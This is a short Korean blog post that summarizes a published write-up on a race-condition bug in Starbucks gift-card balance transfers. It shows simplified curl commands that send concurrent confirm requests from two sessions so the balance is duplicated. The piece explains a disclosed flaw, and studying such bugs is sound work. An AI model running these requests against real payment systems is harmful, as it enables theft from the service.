---
layout: post
title: "Hacking Starbucks for unlimited coffee"
date: 2015-07-17 20:15:05 +0900
comments: true
categories: 
---

[Hacking Starbucks for unlimited coffee](http://sakurity.com/blog/2015/05/21/starbucks.html)

Sakurity 의 글 하나를 요약해본다.

#### race condition

```
POST /step1?amount=1&from=wallet1&to=wallet2
POST /step2?confirm
```

로 two steps 로 되어있는데,

```
curl starbucks/step1 -H Cookie: session=session1 --data amount=1&from=w1&to=w2
curl starbucks/step1 -H Cookie: session=session2 --data amount=1&from=w1&to=w2

curl starbucks/step2confirm -H Cookie: session=session1 & curl starbucks/step2?confirm -H Cookie: session=session2
```

세션 2 개를 만들어서 대여섯번 시도하니, 돈이 복사가 되었다고 한다. 게임에 많이 나오는 돈복사 버그.
